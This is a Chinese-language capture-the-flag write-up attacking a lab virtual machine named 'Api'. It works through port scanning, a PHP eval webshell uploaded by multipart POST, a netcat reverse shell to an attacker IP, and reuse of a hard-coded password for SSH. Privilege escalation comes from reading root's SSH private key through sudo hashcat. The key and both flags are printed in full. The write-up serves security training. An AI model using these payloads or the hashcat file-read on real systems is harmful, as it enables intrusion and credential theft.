# Api


# Api

# 扫描端口

```python
└─# nmap 192.168.56.112
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-10 10:56 CST
Nmap scan report for 192.168.56.112
Host is up (0.00044s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:D1:20:F9 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 13.25 seconds
```

审计源码发现有个 api 的目录

![PixPin_2025-12-10_20-52-35](images/PixPin_2025-12-10_20-52-35-20251210205238-bf5b55a.png)

发现一个 file.php

![PixPin_2025-12-10_21-07-55](images/PixPin_2025-12-10_21-07-55-20251210210811-ksluls7.png)

上传个一句话木马

```php
POST /backend-api/file.php HTTP/1.1
Host: 192.168.56.112
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: PHPSESSID=trlmdd8icibotpjm9r2esb6odf
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Length: 148
Content-Type: multipart/form-data; boundary=----abc123

------abc123
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/png

<?php eval($_POST[1]);?>
------abc123--
```

![PixPin_2025-12-10_21-27-16](images/PixPin_2025-12-10_21-27-16-20251210212717-orp6ov0.png)

然后反弹 shell 并稳固一下

```bash
busybox nc 192.168.56.102 3344 -e /bin/bash
```

```bash
/usr/bin/script -qc /bin/bash /dev/null
按下 ctrl z
stty raw -echo; fg
export TERM=xterm
export SHELL=/bin/bash
```

login.php 发现一个密码 `0tmyxZKD1szqdAYe` 尝试 ssh 登录一下

```php
www-data@Api:/var/www/html$ cat login.php 
<?php
session_start();

// 只允许 POST 方式访问，直接打开 login.php 则跳回首页
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    header('Location: index.php', true, 302);
    exit;
}

// 模拟的固定账号（示例）
$USER = "root";
// 每次请求动态生成与固定明文对应的哈希，用于 password_verify
$PASS_HASH = password_hash("0tmyxZKD1szqdAYe", PASSWORD_DEFAULT);

// 验证码校验
if (
    !isset($_POST['captcha']) ||
    !isset($_SESSION['captcha']) ||
    $_POST['captcha'] != $_SESSION['captcha']
) {
    $_SESSION['msg'] = "验证码错误，请重新输入。";
    header("Location: index.php", true, 302);
    exit;
}

// 用户名 + 密码校验
$username = isset($_POST['username']) ? trim($_POST['username']) : '';
$password = isset($_POST['password']) ? $_POST['password'] : '';

if ($username === $USER && password_verify($password, $PASS_HASH)) {
    $_SESSION['auth'] = true;
    $_SESSION['msg'] = "登录成功！";
    // 登录成功后跳转至 feedback.php
    header("Location: feedback.php", true, 302);
    exit;
} else {
    $_SESSION['msg'] = "账号或密码错误。";
    header("Location: index.php", true, 302);
    exit;
}
```

‍

```php
ssh xiaozhihuaa@192.168.56.112
0tmyxZKD1szqdAYe
```

读一下 user.txt

```php
xiaozhihuaa@Api:~$ ls
user.txt
xiaozhihuaa@Api:~$ cat user.txt 
flag{user-7a1b1a56f991412e9b0c1d8e02a5f945}
```

# 提权

```bash
xiaozhihuaa@Api:~$ sudo -l
Matching Defaults entries for xiaozhihuaa on Api:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User xiaozhihuaa may run the following commands on Api:
    (ALL) NOPASSWD: /usr/bin/hashcat
```

利用 -r 规则文件读取

```php
sudo /usr/bin/hashcat -r /root/root.txt --stdout /dev/null
```

![PixPin_2025-12-10_22-09-55](images/PixPin_2025-12-10_22-09-55-20251210220957-nentaox.png)

‍

读 SSH 私钥登录

```bash
sudo /usr/bin/hashcat -r /root/.ssh/id_rsa --stdout /dev/null 2>&1 | awk -F': ' '{print $2}' > /tmp/root_key
```

> awk -F': ' '{print $2}' 的意思是：
>
> | 部分 | 含义 | |------|------| | -F': ' | 设置分隔符为 : （冒号+空格） | | {print $2} | 打印第 2 个字段 |
>
> 按 : 分割后：
>
> $1 = Skipping invalid or unsupported rule in file /root/.ssh/id_rsa on line 1  
> $2 = -----BEGIN OPENSSH PRIVATE KEY-----

但是用上面这条命令读取的后面还有一行空格要去除一下

```bash
sudo /usr/bin/hashcat -r /root/.ssh/id_rsa --stdout /dev/null 2>&1 | awk -F': ' '{print $2}' | sed '/^$/d' > /tmp/root_key
```

![PixPin_2025-12-10_22-44-19](images/PixPin_2025-12-10_22-44-19-20251210224419-j7jxgrp.png)

然后再使用 root_key 进行登录

```bash
chmod 600 /tmp/root_key
ssh -i /tmp/root_key root@localhost
```

不知道啥原因，一直登录不上，好像 hashcat 输出带颜色导致的每行后面都有不可见字符，最后手动一下吧

```bash
cat > root_key << 'EOF'
-----BEGIN OPENSSH PRIVATE KEY-----
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
zLlbvIB7ezN98AAAAIcm9vdEBBcGkBAgM=
-----END OPENSSH PRIVATE KEY-----
EOF

chmod 600 root_key
ssh -i root_key root@localhost

```

```bash
xiaozhihuaa@Api:~$ md5sum /tmp/root_key
043b04239580e74a47b25634bf0cd566  /tmp/root_key
xiaozhihuaa@Api:~$ ssh -i root_key root@localhost
Linux Api 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Dec 10 10:15:02 2025 from ::1
root@Api:~# id
uid=0(root) gid=0(root) groups=0(root)
root@Api:~# cat root.txt 
flag{root-9f48a1abe48a40c5bf1830b233775a3c}
root@Api:~# 
```

flag：flag{root-9f48a1abe48a40c5bf1830b233775a3c}


---

> 作者: [lpppp](/)  
> URL: https://lpppp.xyz/posts/api/  

